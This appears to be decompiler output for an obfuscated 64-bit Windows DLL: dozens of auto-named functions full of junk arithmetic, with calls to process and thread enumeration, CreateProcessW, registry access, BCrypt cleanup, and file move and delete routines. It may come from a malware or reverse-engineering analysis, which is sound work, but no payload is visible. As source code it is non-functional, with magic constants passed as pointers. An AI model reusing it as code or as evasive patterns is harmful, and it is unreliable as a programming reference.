  uStackY_e0 = 0x180003d3b;
  LVar1 = RegOpenKeyExW(hKey,(LPCWSTR)0x0,0,0,
                        (PHKEY)CONCAT44(in_stack_ffffffffffffff4c,in_stack_ffffffffffffff48));
  uVar10 = 0;
  if (CONCAT44(extraout_var,LVar1) != 0) {
    uVar7 = uVar7 - lVar11 >> 0xe;
    uVar10 = CONCAT44(extraout_var,LVar1) | uVar7 | (ulonglong)local_80 & (ulonglong)hKey;
  }
  lpThreadAttributes = (LPSECURITY_ATTRIBUTES)(uVar9 ^ uVar5);
  if ((POPCOUNT(lVar11 + 0x1d + (ulonglong)((uVar10 >> 6 & 1) != 0) & unaff_RBX & 0xff) & 1U) != 0)
  {
    lpThreadAttributes =
         (LPSECURITY_ATTRIBUTES)((longlong)&lpThreadAttributes->lpSecurityDescriptor + 7);
  }
  uVar9 = 0x5d21fe7e0c8fc4c3;
  uStackY_e0 = 0x180003dac;
  uVar3 = _beginthreadex((void *)0x5d21fe7e0c8fc4c3,(uint)unaff_RBX,local_78,lpThreadAttributes,
                         in_stack_ffffffffffffff48,
                         (uint *)CONCAT44(in_stack_ffffffffffffff54,in_stack_ffffffffffffff50));
  uVar10 = 0;
  if (uVar3 != 0) {
    uVar10 = (uVar3 | (ulonglong)local_78) - 0x1c;
    uVar9 = (uVar9 ^ uVar5) - ((ulonglong)local_78 ^ (ulonglong)lpThreadAttributes);
  }
  if ((longlong)
      ((uVar9 - 0xd) -
      (ulonglong)(uVar5 < 0x12 || uVar5 - 0x12 < (ulonglong)(uVar3 != 0 && uVar7 << 0x1c < 0xc))) <
      0) {
    lpThreadAttributes = (LPSECURITY_ATTRIBUTES)((ulonglong)lpThreadAttributes ^ uVar10);
  }
  uStackY_e0 = 0x180003e12;
  FUN_180008438(&stack0xffffffffffffff48,0);
  lVar11 = 0x7935bb3284d6b1c9;
  lVar8 = 0;
  uStackY_e0 = 0x180003e43;
  uVar5 = FUN_180037128();
  if (uVar5 != 0) {
    lVar8 = lVar8 + 2;
    lpThreadAttributes = local_80;
  }
  lpProcessAttributes = (LPSECURITY_ATTRIBUTES)(lVar8 + 0xe);
  uStackY_e0 = 0x180003e9b;
  BVar2 = CreateProcessW((LPCWSTR)&DAT_1800baadb,(LPWSTR)(lVar11 + 0x10),lpProcessAttributes,
                         lpThreadAttributes,in_stack_ffffffffffffff48,in_stack_ffffffffffffff50,
                         in_stack_ffffffffffffff58,in_stack_ffffffffffffff60,
                         in_stack_ffffffffffffff68,in_stack_ffffffffffffff70);
  puVar4 = (undefined1 *)0x0;
  if (CONCAT44(extraout_var_00,BVar2) != 0) {
    puVar4 = local_130;
  }
  return (longlong)puVar4 * (longlong)lpProcessAttributes;
}


```

---

## Function: FUN_180003ed8 (0x180003ed8)

```c

/* WARNING: Removing unreachable block (ram,0x000180003fac) */
/* WARNING: Removing unreachable block (ram,0x000180004055) */

void FUN_180003ed8(longlong param_1)

{
  undefined *puVar1;
  ulonglong unaff_RBX;
  longlong unaff_RSI;
  ulonglong uVar2;
  longlong unaff_RDI;
  ulonglong uVar3;
  ulonglong in_R11;
  longlong lVar4;
  ulonglong unaff_R13;
  undefined1 local_d0 [56];
  undefined1 local_98 [104];
  
  uVar2 = unaff_RSI + unaff_RDI;
  if (((ulonglong)local_98 & param_1 + 0xdU) != 0) {
    in_R11 = ((in_R11 | param_1 + 0xdU) - 6) - ((ulonglong)local_98 ^ 0x18e3e468130844ad);
    uVar2 = (ulonglong)local_d0 & (unaff_R13 | 0x1800c584e);
  }
  lVar4 = in_R11 - (unaff_R13 ^ uVar2);
  puVar1 = &DAT_1800d2cb0;
  uVar3 = 0;
  uVar2 = FUN_180047008();
  if (uVar2 == 0) {
    uVar3 = uVar3 ^ unaff_RBX;
  }
  FUN_18000a3c0(local_d0,((longlong)puVar1 - lVar4 ^ uVar2) * uVar3 + 0x19,0);
  FUN_1800097f8();
  return;
}


```

---

## Function: FUN_1800040b8 (0x1800040b8)

```c

ulonglong FUN_1800040b8(void)

{
  longlong lVar1;
  ulonglong uVar2;
  longlong unaff_RBX;
  longlong in_R11;
  ulonglong uVar3;
  longlong unaff_R12;
  
  FUN_18000b3b8();
  uVar3 = in_R11 + unaff_R12;
  lVar1 = FUN_18003dd00();
  uVar2 = 0;
  if (lVar1 != 0) {
    uVar2 = lVar1 - unaff_RBX | uVar3;
  }
  return uVar2;
}


```

---

## Function: FUN_180004150 (0x180004150)

```c

/* WARNING: Removing unreachable block (ram,0x000180004195) */

void FUN_180004150(void)

{
  return;
}


```

---

## Function: FUN_180004200 (0x180004200)

```c

undefined1 * FUN_180004200(void)

{
  undefined1 local_20 [16];
  
  return local_20;
}


```

---

## Function: FUN_180004250 (0x180004250)

```c

ulonglong FUN_180004250(undefined8 param_1,undefined8 param_2,ulonglong param_3)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  longlong unaff_RDI;
  
  uVar1 = in_RAX >> 0x1a;
  if (unaff_RDI >> 0x1a < 0) {
    uVar1 = uVar1 - (0x6233db4f02d7586a - (ulonglong)(0xfffffffffffffff2 < param_3));
  }
  return uVar1;
}


```

---

## Function: FUN_1800042c8 (0x1800042c8)

```c

void FUN_1800042c8(void)

{
  FUN_180046a70();
  return;
}


```

---

## Function: FUN_180004320 (0x180004320)

```c

longlong FUN_180004320(undefined8 param_1,longlong param_2)

{
  longlong lVar1;
  undefined1 *puVar2;
  ulonglong unaff_R15;
  undefined1 auStack_38 [32];
  
  puVar2 = &stack0xffffffffffffffe8;
  if ((longlong)(unaff_R15 & (ulonglong)auStack_38) < 0) {
    puVar2 = (undefined1 *)(((ulonglong)&stack0xffffffffffffffe8 | unaff_R15) - (param_2 + 4));
  }
  lVar1 = CreateToolhelp32Snapshot(&DAT_1800cb5e9,0,puVar2 + 0x15,&stack0x00000000);
  if (lVar1 == 0) {
    lVar1 = 0;
  }
  return lVar1;
}


```

---

## Function: FUN_1800043e0 (0x1800043e0)

```c

ulonglong FUN_1800043e0(void)

{
  BOOL BVar1;
  undefined4 extraout_var;
  ulonglong uVar2;
  undefined1 *puVar3;
  ulonglong uVar4;
  longlong unaff_RDI;
  ulonglong in_R9;
  ulonglong in_R10;
  longlong unaff_R12;
  ulonglong uVar5;
  undefined1 auStack_88 [40];
  longlong local_60;
  longlong local_58 [4];
  undefined1 local_38 [48];
  
  uVar4 = 0;
  BVar1 = RemoveDirectoryA((LPCSTR)0xd632e432d7132031);
  if (CONCAT44(extraout_var,BVar1) == 0) {
    unaff_RDI = (unaff_RDI - in_R10 | in_R10) + 0x12;
    in_R9 = in_R9 | uVar4;
  }
  uVar5 = unaff_R12 << 0x1f;
  uVar4 = in_R9 * 0x20000000 - 0x1b;
  local_60 = local_60 + ((ulonglong)local_58 | unaff_RDI * 0x4000);
  puVar3 = local_38;
  if ((uVar5 & (ulonglong)auStack_88) == 0) {
    uVar2 = (ulonglong)puVar3 ^ uVar5;
    local_60 = local_60 - uVar2;
    puVar3 = (undefined1 *)(uVar2 + (uVar5 | uVar2));
    uVar4 = uVar4 >> 0x12;
  }
  uVar5 = local_60 + 2 + (ulonglong)(uVar4 < (ulonglong)(unaff_RDI * 0x4000));
  uVar2 = local_58[0] + 3 + (ulonglong)(((longlong)(uVar4 + unaff_RDI * -0x4000) >> 9 & 1U) != 0);
  uVar4 = (longlong)puVar3 * uVar4 - uVar2 ^ uVar5;
  if (-1 < (longlong)uVar4) {
    uVar4 = (uVar4 ^ uVar2) & uVar5 & uVar4;
  }
  return uVar4;
}


```

---

## Function: FUN_180004510 (0x180004510)

```c

void FUN_180004510(void)

{
  FUN_180032ba0();
  return;
}


```

---

## Function: FUN_180004580 (0x180004580)

```c

undefined8 FUN_180004580(void)

{
  FUN_180017c40();
  return 0;
}


```

---

## Function: FUN_180004628 (0x180004628)

```c

/* WARNING: Removing unreachable block (ram,0x000180004763) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_180004628(void)

{
  longlong lVar1;
  ulonglong uVar2;
  undefined1 *puVar3;
  int iVar4;
  longlong unaff_RSI;
  undefined8 uVar5;
  undefined1 *puVar6;
  int in_R11D;
  ulonglong unaff_R12;
  longlong unaff_R13;
  undefined1 local_130 [96];
  undefined8 uStackY_d0;
  undefined1 auStackY_c8 [32];
  int in_stack_ffffffffffffff58;
  BOOL in_stack_ffffffffffffff60;
  undefined1 local_98 [8];
  longlong local_90;
  int local_78;
  undefined1 local_60 [56];
  
  if ((unaff_R12 & (ulonglong)auStackY_c8) != 0) {
    unaff_R13 = unaff_R13 << 0xe;
  }
  puVar6 = local_60;
  puVar3 = local_98;
  uVar2 = local_90 + 9;
  uStackY_d0 = 0x1800046d4;
  lVar1 = FUN_180052ec0();
  if (lVar1 != 0) {
    puVar3 = (undefined1 *)((ulonglong)puVar3 & uVar2);
    uVar2 = uVar2 ^ ((ulonglong)puVar6 ^ uVar2) &
                    (unaff_R13 + unaff_RSI ^ (ulonglong)puVar6 ^ uVar2);
  }
  iVar4 = (int)(local_130 + (longlong)puVar3);
  if (-1 < (longlong)uVar2) {
    iVar4 = local_78;
  }
  uStackY_d0 = 0x180004756;
  FUN_180034550();
  lVar1 = 0x25f867fafd4785d6;
  uStackY_d0 = 0x1800047c3;
  MoveWindow((HWND)0x18,-0x2b87a2a,in_R11D,0x1eb00000 - iVar4,in_stack_ffffffffffffff58,
             in_stack_ffffffffffffff60);
  lVar1 = lVar1 + 10;
  uVar5 = 0;
  uStackY_d0 = 0x180004834;
  FUN_180005c88();
  uStackY_d0 = 0x18000483c;
  FUN_18003b4f0(uVar5,lVar1);
  return 0xa23f91d4d3fb9428;
}


```

---

## Function: FUN_180004868 (0x180004868)

```c

void FUN_180004868(void)

{
  return;
}


```

---

## Function: FUN_180004938 (0x180004938)

```c

/* WARNING: Removing unreachable block (ram,0x0001800049c8) */

longlong FUN_180004938(void)

{
  longlong lVar1;
  uint uVar2;
  ulonglong unaff_RBX;
  ulonglong in_R11;
  uint unaff_R13D;
  
  uVar2 = 0x800bab2b;
  if ((longlong)(in_R11 & unaff_RBX) < 1) {
    uVar2 = unaff_R13D & 0x800bab2b;
  }
  lVar1 = FUN_18000b860(0x80ad4b135ca94e68,uVar2);
  return lVar1;
}


```

---

## Function: FUN_1800049f8 (0x1800049f8)

```c

longlong FUN_1800049f8(void)

{
  longlong extraout_RAX;
  longlong unaff_RSI;
  longlong in_R11;
  
  _aligned_free(&stack0xffffffffffffffe8);
  if (extraout_RAX == 0) {
    unaff_RSI = unaff_RSI * 0x10 + 4;
  }
  return ((longlong)&stack0xffffffffffffffe8 * 4 - in_R11) + unaff_RSI + 0x10;
}


```

---

## Function: FUN_180004a98 (0x180004a98)

```c

undefined1 * FUN_180004a98(void)

{
  undefined1 auStack_15 [5];
  
  FUN_18004e030();
  return auStack_15;
}


```

---

## Function: FUN_180004b38 (0x180004b38)

```c

ulonglong FUN_180004b38(void)

{
  ulonglong uVar1;
  ulonglong unaff_RBX;
  
  uVar1 = FUN_18000a770();
  return uVar1 ^ unaff_RBX;
}


```

---

## Function: FUN_180004ba8 (0x180004ba8)

```c

/* WARNING: Removing unreachable block (ram,0x000180004bd3) */

longlong FUN_180004ba8(void)

{
  longlong lVar1;
  longlong unaff_RDI;
  
  lVar1 = FUN_180004d78();
  return (lVar1 + -0x12) * (unaff_RDI - 0x18U >> 4);
}


```

---

## Function: FUN_180004c38 (0x180004c38)

```c

void FUN_180004c38(void)

{
  Process32NextW();
  return;
}


```

---

## Function: FUN_180004c88 (0x180004c88)

```c

/* WARNING: Removing unreachable block (ram,0x000180004d41) */

undefined1 * FUN_180004c88(void)

{
  NTSTATUS NVar1;
  undefined4 extraout_var;
  undefined1 *puVar2;
  undefined1 auStack_1a [10];
  
  NVar1 = BCryptDestroyKey((BCRYPT_KEY_HANDLE)0x83ae403e910bde1c);
  puVar2 = (undefined1 *)CONCAT44(extraout_var,NVar1);
  if (puVar2 == (undefined1 *)0x0) {
    puVar2 = auStack_1a;
  }
  return puVar2;
}


```

---

## Function: FUN_180004d78 (0x180004d78)

```c

longlong FUN_180004d78(void)

{
  longlong lVar1;
  longlong in_R10;
  ulonglong uVar2;
  longlong unaff_R12;
  
  uVar2 = 0;
  lVar1 = FUN_1800097f8();
  return lVar1 * unaff_R12 * in_R10 + 0x24 + (ulonglong)(uVar2 < 0x1d);
}


```

---

## Function: FUN_180004e20 (0x180004e20)

```c

/* WARNING: Removing unreachable block (ram,0x000180004f01) */

undefined8 FUN_180004e20(void)

{
  FUN_180004628();
  return 0xe9103cf256f16055;
}


```

---

## Function: FUN_180004f90 (0x180004f90)

```c

void FUN_180004f90(void)

{
  FUN_18004d0d8(0);
  return;
}


```

---

## Function: FUN_180005010 (0x180005010)

```c

longlong FUN_180005010(void)

{
  longlong lVar1;
  longlong *plVar2;
  longlong lVar3;
  longlong lVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  ulonglong unaff_R13;
  longlong local_40 [3];
  longlong local_28;
  
  lVar4 = 0;
  uVar6 = 0;
  lVar3 = local_28 + -0x1d;
  uVar5 = 0;
  lVar1 = FUN_18004f0f0();
  if (lVar1 == 0) {
    lVar3 = lVar3 + 4;
  }
  plVar2 = local_40;
  if (-1 < (longlong)(uVar6 & unaff_R13)) {
    plVar2 = (longlong *)((ulonglong)plVar2 | uVar5);
  }
  return (local_40[0] + 0x16 +
         (ulonglong)(SEXT816(lVar3 * lVar4) != SEXT816(lVar3) * SEXT816(lVar4))) * (longlong)plVar2;
}


```

---

## Function: FUN_180005140 (0x180005140)

```c

undefined8 FUN_180005140(void)

{
  return 0xdcdc1e6a00000000;
}


```

---

## Function: FUN_1800051a0 (0x1800051a0)

```c

/* WARNING: Removing unreachable block (ram,0x0001800051ff) */

void FUN_1800051a0(void)

{
  FUN_180005c28();
  FUN_180026648();
  return;
}


```

---

## Function: FUN_180005250 (0x180005250)

```c

undefined8 FUN_180005250(void)

{
  return 0xfffffffffffffff7;
}


```

---

## Function: FUN_180005340 (0x180005340)

```c

undefined8 FUN_180005340(void)

{
  return 0;
}


```

---

## Function: FUN_180005408 (0x180005408)

```c

ulonglong FUN_180005408(undefined8 param_1,longlong param_2)

{
  ulonglong in_RAX;
  HANDLE pvVar1;
  longlong lVar2;
  ulonglong uVar3;
  LPWIN32_FIND_DATAA lpFindFileData;
  longlong unaff_RSI;
  longlong unaff_R12;
  ulonglong uVar4;
  ulonglong unaff_R13;
  
  uVar4 = ((unaff_R12 - (param_2 + 0x19U)) + 0x6695c3e3d6a4a8a) * 0x2000000 &
          (in_RAX & unaff_R13 & param_2 + 0x19U) * unaff_RSI;
  uVar3 = 0xf2f4443dfec80a45;
  lpFindFileData = (LPWIN32_FIND_DATAA)(param_2 + 0x29);
  pvVar1 = FindFirstFileA((LPCSTR)0xf2f4443dfec80a45,lpFindFileData);
  if (pvVar1 == (HANDLE)0x0) {
    uVar4 = (uVar4 ^ (ulonglong)lpFindFileData) & uVar3 >> 0xd;
  }
  uVar3 = 0x773f258c6df4dc32;
  lVar2 = FUN_18003c2b8();
  if (lVar2 == 0) {
    uVar3 = (uVar3 & 0xf996a3c1c295b576) - (uVar4 >> 1) >> 0x12;
  }
  return uVar3 + 0x2d >> 0x11;
}


```

---

## Function: FUN_180005558 (0x180005558)

```c

/* WARNING: Removing unreachable block (ram,0x000180005653) */

void FUN_180005558(void)

{
  longlong unaff_RSI;
  CHAR local_68 [80];
  
  RemoveDirectoryA(local_68 + unaff_RSI);
  FUN_180045760();
  return;
}


```

---

## Function: FUN_180005690 (0x180005690)

```c

/* WARNING: Removing unreachable block (ram,0x000180005743) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_180005690(void)

{
  return 0xffffffffffffffe6;
}


```

---

## Function: FUN_1800057a8 (0x1800057a8)

```c

void FUN_1800057a8(void)

{
  undefined4 in_EAX;
  NTSTATUS NVar1;
  undefined4 in_register_00000004;
  undefined4 extraout_var;
  HWND hWnd;
  longlong lVar2;
  int unaff_EBX;
  int unaff_ESI;
  uint unaff_EDI;
  longlong lVar3;
  int in_R9D;
  uint uVar4;
  int in_R10D;
  int unaff_R12D;
  uint uVar5;
  int in_stack_ffffffffffffffc8;
  BOOL in_stack_ffffffffffffffd0;
  int local_18;
  
  uVar5 = unaff_R12D - in_R10D;
  hWnd = (HWND)&DAT_1800cf52c;
  lVar2 = 0x73f4d57c5fab25df;
  lVar3 = CONCAT44(in_register_00000004,in_EAX);
  uVar4 = in_R9D + 0x2c;
  NVar1 = BCryptDestroyHash(&DAT_1800cf52c);
  if (CONCAT44(extraout_var,NVar1) != 0) {
    lVar2 = lVar2 + lVar3;
    lVar3 = lVar3 + -0x1c;
    uVar5 = uVar5 - uVar4 & (unaff_EDI ^ uVar4);
    unaff_EBX = local_18;
  }
  MoveWindow(hWnd,(int)(lVar2 >> 2),(int)lVar3,(uVar4 ^ uVar5) & unaff_EBX - unaff_ESI,
             in_stack_ffffffffffffffc8,in_stack_ffffffffffffffd0);
  return;
}


```

---

## Function: FUN_180005928 (0x180005928)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_180005928(void)

{
  _DAT_d6de6ebc = 0x180005965;
  FUN_18000dae0();
  _DAT_d6de6ebc = 0x1800059e3;
  FUN_180044558();
  _DAT_d6de6ebc = 0x180005a0c;
  FUN_1800181d0();
  return 0xd6de6ef6;
}


```

---

## Function: FUN_180005a30 (0x180005a30)

```c

longlong FUN_180005a30(void)

{
  return -0x4e464bd368000000;
}


```

---

## Function: FUN_180005aa8 (0x180005aa8)

```c

longlong FUN_180005aa8(void)

{
  longlong in_RAX;
  
  return (in_RAX >> 0x11) << 0x19;
}


```

---

## Function: FUN_180005b20 (0x180005b20)

```c

void FUN_180005b20(void)

{
  FUN_180018ad8();
  FUN_1800354a0();
  return;
}


```

---

## Function: FUN_180005c28 (0x180005c28)

```c

void FUN_180005c28(void)

{
  FUN_18000b3b8();
  return;
}


```

---

## Function: FUN_180005c88 (0x180005c88)

```c

void FUN_180005c88(void)

{
  return;
}


```

---

## Function: FUN_180005cf0 (0x180005cf0)

```c

undefined8 FUN_180005cf0(void)

{
  undefined8 unaff_R15;
  
  return unaff_R15;
}


```

---

## Function: FUN_180005d68 (0x180005d68)

```c

undefined1 * FUN_180005d68(undefined8 param_1,undefined8 param_2,DWORD param_3)

{
  PHKEY unaff_RBP;
  
  RegOpenKeyExW((HKEY)0x63cdbbccddeda161,(LPCWSTR)&DAT_1800c0cf3,param_3,0,unaff_RBP);
  return &stack0xfffffffffffffff8;
}


```

---

## Function: FUN_180005dd0 (0x180005dd0)

```c

void FUN_180005dd0(void)

{
  FUN_18004f458();
  return;
}


```

---

## Function: FUN_180005e50 (0x180005e50)

```c

longlong FUN_180005e50(void)

{
  longlong in_RAX;
  
  return in_RAX + 7;
}


```

---

## Function: FUN_180005eb8 (0x180005eb8)

```c

/* WARNING: Removing unreachable block (ram,0x000180005f37) */
/* WARNING: Removing unreachable block (ram,0x000180005f7b) */

longlong FUN_180005eb8(void)

{
  longlong local_20;
  
  FUN_18003cd88();
  return local_20 + -0x10 >> 8;
}


```

---

## Function: FUN_180005fa0 (0x180005fa0)

```c

void FUN_180005fa0(void)

{
  FUN_18004df88();
  return;
}


```

---

## Function: FUN_1800060b0 (0x1800060b0)

```c

undefined1 * FUN_1800060b0(void)

{
  undefined1 *puVar1;
  ulonglong unaff_RBX;
  ulonglong unaff_RDI;
  ulonglong uVar2;
  undefined1 local_38 [24];
  longlong local_20;
  
  puVar1 = local_38;
  uVar2 = (unaff_RDI | unaff_RBX) >> 0x1f;
  if (local_20 < 1) {
    puVar1 = (undefined1 *)(local_20 + uVar2);
  }
  return puVar1 + uVar2;
}


```

---

## Function: FUN_180006138 (0x180006138)

```c

/* WARNING: Removing unreachable block (ram,0x000180006194) */

void FUN_180006138(void)

{
  return;
}


```

---

## Function: FUN_1800061d0 (0x1800061d0)

```c

longlong FUN_1800061d0(void)

{
  longlong lVar1;
  ulonglong unaff_RSI;
  ulonglong in_R10;
  
  lVar1 = FUN_180050878();
  if (lVar1 == 0) {
    unaff_RSI = unaff_RSI & in_R10;
  }
  return unaff_RSI + 0xa0348659;
}


```

---

## Function: FUN_180006298 (0x180006298)

```c

void FUN_180006298(void)

{
  RemoveDirectoryA(&stack0xfffffffffffffff0);
  return;
}


```

---

## Function: FUN_180006318 (0x180006318)

```c

void FUN_180006318(void)

{
  return;
}


```

---

## Function: FUN_180006368 (0x180006368)

```c

undefined8 FUN_180006368(void)

{
  return 0;
}


```

---

## Function: FUN_1800063d0 (0x1800063d0)

```c

/* WARNING: Removing unreachable block (ram,0x0001800065bc) */

longlong FUN_1800063d0(void)

{
  BOOL BVar1;
  undefined4 extraout_var;
  longlong lVar2;
  ulonglong uVar3;
  longlong unaff_RSI;
  ulonglong unaff_RDI;
  ulonglong uVar4;
  ulonglong uVar5;
  longlong in_R9;
  ulonglong uVar6;
  undefined *puVar7;
  ulonglong in_R10;
  longlong lVar8;
  ulonglong unaff_R12;
  undefined1 *puVar9;
  ulonglong local_158;
  undefined1 auStack_d8 [48];
  undefined1 local_a8 [8];
  undefined1 local_a0 [64];
  WCHAR local_60 [24];
  
  uVar4 = 0;
  uVar3 = 0xff0950b83b13d9e8;
  uVar6 = in_R9 - unaff_RSI;
  BVar1 = MoveFileW((LPCWSTR)0xff0950b83b13d9e8,local_60);
  if (CONCAT44(extraout_var,BVar1) == 0) {
    unaff_RDI = unaff_RDI ^ unaff_R12;
    uVar3 = uVar3 - 0xc & uVar4;
    in_R10 = 0;
  }
  uVar5 = uVar4 + 9;
  if ((unaff_R12 & (ulonglong)auStack_d8) != 0) {
    uVar5 = uVar5 ^ unaff_RDI + 0xf;
  }
  puVar9 = local_a8;
  lVar8 = ((in_R10 ^ (uVar6 ^ unaff_R12) + 0x1f) + 0x12 +
          (ulonglong)(0xfffffffffffffffa < local_158)) * uVar5 + 0xb;
  puVar7 = &DAT_1800d24b0;
  lVar2 = FUN_18002e060();
  if (lVar2 == 0) {
    puVar7 = puVar7 + lVar8;
    puVar9 = puVar9 + (longlong)puVar7;
  }
  uVar6 = CreateToolhelp32Snapshot(&DAT_1800bac12,puVar7,local_a0);
  uVar6 = uVar6 >> 7;
  if ((longlong)
      ((longlong)puVar9 * (local_158 + uVar3 * (unaff_RSI + unaff_RDI & uVar4)) * local_158 &
      (ulonglong)auStack_d8) < 0) {
    uVar6 = uVar6 | uVar5;
  }
  return ((longlong)(uVar6 << 6) >> 0x1d) + -5;
}


```

---

## Function: FUN_1800065e8 (0x1800065e8)

```c

ulonglong FUN_1800065e8(void)

{
  longlong lVar1;
  undefined1 *puVar2;
  undefined *puVar3;
  ulonglong unaff_RBX;
  WPARAM wParam;
  LPARAM lParam;
  ulonglong in_R10;
  undefined1 local_140 [112];
  undefined8 uStackY_d0;
  PHKEY in_stack_ffffffffffffff58;
  undefined1 local_78 [40];
  undefined1 local_50 [40];
  
  puVar2 = &stack0xffffffffffffff58;
  wParam = 0;
  lParam = 0;
  uStackY_d0 = 0x180006647;
  lVar1 = RtlZeroMemory(puVar2,((ulonglong)local_140 ^ unaff_RBX | (ulonglong)local_78) + 0x10);
  if (lVar1 == 0) {
    puVar2 = (undefined1 *)((ulonglong)puVar2 ^ in_R10);
  }
  puVar3 = &DAT_1800c9003;
  uStackY_d0 = 0x18000667b;
  DefWindowProcA((HWND)(puVar2 + 9),0x800c9003,wParam,lParam);
  uStackY_d0 = 0x1800066b8;
  RegOpenKeyExW((HKEY)0x59fd0e186bde5b9b,(LPCWSTR)(puVar3 + 0x1e),(int)wParam - 0x1e,(REGSAM)lParam,
                in_stack_ffffffffffffff58);
  uStackY_d0 = 0x1800066f5;
  FUN_180043358();
  return (ulonglong)local_50 >> 6;
}


```

---

## Function: FUN_1800067b8 (0x1800067b8)

```c

void FUN_1800067b8(void)

{
  LPWSTR lpBuffer;
  
  lpBuffer = (LPWSTR)0x0;
  GetCurrentDirectoryW(0x1d184ffd,(LPWSTR)0x0);
  GetCurrentDirectoryW((DWORD)lpBuffer,lpBuffer);
  return;
}


```

---

## Function: FUN_180006880 (0x180006880)

```c

void FUN_180006880(void)

{
  FUN_18000d0e8();
  return;
}


```

---

## Function: FUN_180006930 (0x180006930)

```c

void FUN_180006930(void)

{
  REGSAM in_R9D;
  PHKEY in_stack_ffffffffffffffb8;
  
  FlushFileBuffers((HANDLE)0x2e120288f7ebe27b);
  RegOpenKeyExW((HKEY)0xe82391d56b19732f,(LPCWSTR)&DAT_1800c89a4,0x800bad72,in_R9D,
                in_stack_ffffffffffffffb8);
  FUN_180024cf0();
  return;
}


```

---

## Function: FUN_180006a80 (0x180006a80)

```c

/* WARNING: Removing unreachable block (ram,0x000180006b60) */
/* WARNING: Removing unreachable block (ram,0x000180006bc0) */

void FUN_180006a80(void)

{
  undefined1 local_98 [40];
  undefined1 local_70 [32];
  undefined1 local_50 [56];
  
  Thread32Next();
  FUN_1800277d8();
  RemoveDirectoryA((LPCSTR)0x0);
  FUN_18001eb38(local_98,0,(ulonglong)local_70 | (ulonglong)local_50);
  return;
}


```

---

## Function: FUN_180006c58 (0x180006c58)

```c

longlong FUN_180006c58(void)

{
  longlong lVar1;
  ulonglong unaff_RSI;
  longlong in_R11;
  ulonglong uVar2;
  longlong unaff_R13;
  
  uVar2 = in_R11 >> 6;
  lVar1 = FUN_18004f868();
  if (lVar1 == 0) {
    uVar2 = ((uVar2 + unaff_R13 & (ulonglong)((longlong)register0x00000020 + 3)) - 0xd) * 0x20000000
    ;
  }
  return lVar1 + 0x10 + (ulonglong)(uVar2 < unaff_RSI);
}


```

---

## Function: FUN_180006d08 (0x180006d08)

```c

/* WARNING: Removing unreachable block (ram,0x000180006d62) */

void FUN_180006d08(void)

{
  FUN_1800268e0();
  return;
}


```

---

## Function: FUN_180006d88 (0x180006d88)

```c

void FUN_180006d88(void)

{
  FindClose((HANDLE)0x1588741b1dc374f);
  return;
}


```

---

## Function: FUN_180006e68 (0x180006e68)

```c

ulonglong FUN_180006e68(void)

{
  undefined1 *puVar1;
  undefined1 *puVar2;
  undefined1 local_res8 [32];
  
  puVar2 = local_res8;
  puVar1 = FUN_18004a910();
  return (ulonglong)puVar1 ^ (ulonglong)puVar2;
}


```

---

